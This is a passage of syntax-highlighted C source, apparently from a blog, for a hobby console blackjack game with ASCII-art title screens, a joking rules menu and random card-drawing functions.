class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span></span>;     <span class="comment">//Displays Heart Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span></span>;     <span class="comment">//Displays Spade Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span></span>;      <span class="comment">//Generates random card</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span></span>;       <span class="comment">//Asks user amount to bet</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span></span>;     <span class="comment">//Asks user to continue</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span></span>;        <span class="comment">//Prints "Rules of Vlad's Blackjack" menu</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>;         <span class="comment">//Plays game</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span></span>;       <span class="comment">//Function to play for dealer AI</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span></span>;         <span class="comment">//Function for when user selects 'Stay'</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span></span>;    <span class="comment">//Test for if user has cash remaining in purse</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span></span>;      <span class="comment">//Asks if user wants to continue playing</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span></span>;  <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Main Function</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">game</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n              222                111                            "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n            222 222            11111                              "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n           222   222          11 111                            "</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n                222              111                               "</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n               222               111                           "</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span>, club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span>, club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span>, club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                                         </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span>, club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n                        21                                   "</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span>, diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span>, diamond, diamond, heart, heart, club, club, spade, spade);                                      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c       %c    %c     %c          %c  %c               "</span>, diamond, diamond, heart, heart, club, spade, spade);                                           </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span>, diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span>, diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        %c%c      %c      %c    %c          %c   %c               "</span>, diamond, diamond, heart, heart, club, spade, spade);                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span>, diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span>, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n         222                     111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n        222                      111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n       222                       111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      222222222222222      111111111111111                       "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n      2222222222222222    11111111111111111                         "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">     </span><br><span class="line">    asktitle();</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="comment">//system("pause");</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//end program</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to continue</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">    <span class="keyword">int</span> choice2;</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                 Are You Ready?"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                ----------------"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                      (Y/N)\n                        "</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">            <span class="comment">//system("clear");</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 2 to See a Complete Listing of Rules."</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nEnter 3 to Exit Game. (Not Recommended)"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\nChoice: "</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2); <span class="comment">// Prompts user for choice</span></span><br><span class="line">            <span class="keyword">if</span>((choice2&lt;<span class="number">1</span>) || (choice2&gt;<span class="number">3</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(choice2) <span class="comment">// Switch case for different choices</span></span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Case to begin game</span></span><br><span class="line">                  <span class="comment">// system("clear");</span></span><br><span class="line">                    </span><br><span class="line">                   play();</span><br><span class="line">                                       </span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Case to see rules</span></span><br><span class="line">                 <span class="comment">//  system("clear");</span></span><br><span class="line">                   rules();</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// Case to exit game</span></span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nYour day could have been perfect."</span>);</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nHave an almost perfect day!\n\n"</span>);</span><br><span class="line">                   <span class="comment">//system("pause");</span></span><br><span class="line">                   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">"\nInvalid Input"</span>);</span><br><span class="line">            &#125; <span class="comment">// End switch case</span></span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nYour day could have been perfect."</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nHave an almost perfect day!\n\n"</span>);</span><br><span class="line">        <span class="comment">//system("pause");</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span> <span class="comment">//Prints "Rules of Vlad's Blackjack" list</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> choice1;</span><br><span class="line">     <span class="keyword">int</span> choice2;</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n           RULES of VLAD's BLACKJACK"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n          ---------------------------"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nI."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Thou shalt not question the odds of this game."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c This program generates cards at random."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c If you keep losing, you are very unlucky!\n"</span>, diamond);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nII."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Each card has a value."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Number cards 1 to 10 hold a value of their number."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c J, Q, and K cards hold a value of 10."</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Ace cards hold a value of 11"</span>, club);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     The goal of this game is to reach a card value total of 21.\n"</span>);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nIII."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c Staying will keep you safe, hitting will add a card."</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     Because you are competing against the dealer, you must beat his hand."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n     BUT BEWARE!."</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n      %c If your total goes over 21, you will LOSE!."</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n"</span>, spade, heart, club, club, heart, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nWould you like to go the previous screen? (I will not take NO for an answer)"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\n                  (Y/N)\n                    "</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">         <span class="comment">//   system("clear");</span></span><br><span class="line">            asktitle();</span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, convinces user to enter yes</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// system("clear");</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n                 I told you so.\n"</span>);</span><br><span class="line">        asktitle();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span> <span class="comment">//Displays Club Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="comment">//srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line"> </span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;           </span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span> <span class="comment">//Displays Diamond Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="comment">//srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span> <span class="comment">//Displays Heart Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">   <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q 